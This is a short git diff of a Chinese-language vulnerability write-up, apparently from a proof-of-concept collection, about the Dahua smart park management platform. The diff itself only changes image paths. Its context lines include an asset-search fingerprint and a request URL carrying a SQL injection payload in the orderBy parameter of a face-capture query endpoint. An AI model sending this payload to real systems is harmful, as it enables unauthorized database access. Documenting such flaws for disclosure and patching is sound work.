@@ -16,7 +16,7 @@ app="dahua-智慧园区综合管理平台"
 
 ## 漏洞复现
 
-![image-20230828144644472](images/image-20230828144644472.png)
+![image-20230828144644472](../.gitbook/assets/image-20230828144644472.png)
 
 请求POC
 
@@ -24,4 +24,4 @@ app="dahua-智慧园区综合管理平台"
 /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
 ```
 
-![image-20230828145938818](images/image-20230828145938818.png)
+![image-20230828145938818](../.gitbook/assets/image-20230828145938818.png)
